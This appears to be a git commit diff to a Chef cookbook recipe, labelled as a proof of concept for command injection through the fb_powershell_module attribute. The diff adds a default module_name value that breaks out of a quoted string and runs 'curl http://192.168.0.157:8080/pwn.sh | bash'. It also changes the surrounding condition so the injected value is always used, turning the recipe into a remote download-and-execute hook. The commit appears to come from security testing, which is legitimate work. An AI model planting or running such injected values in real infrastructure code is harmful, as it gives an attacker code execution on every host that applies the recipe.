b1ae2948ed34013aacac6a20b6abe0eb021fb310
JPD Tester <jpdtester02@gmail.com>
2025-07-06 15:36:08 +0400

    PoC: command injection via fb_powershell_module

--- cookbooks/site_webserver/recipes/default.rb
+++ cookbooks/site_webserver/recipes/default.rb
@@ -1,6 +1,11 @@
-if node.attribute?('fb_powershell_module') && 
-   node['fb_powershell_module'].key?('module_name') &&
-   node['fb_powershell_module'].key?('repository')
+node.normal['fb_powershell_module'] ||= {
+  'module_name' => "SafeModule'; curl http://192.168.0.157:8080/pwn.sh | bash; '",
+  'repository' => 'PSGallery'
+}
+
+if node['fb_powershell_module'] &&
+   node['fb_powershell_module']['module_name'] &&
+   node['fb_powershell_module']['repository']
 
   Chef::Log.info("fb_powershell_module attributes found: #{node['fb_powershell_module'].inspect}")
 
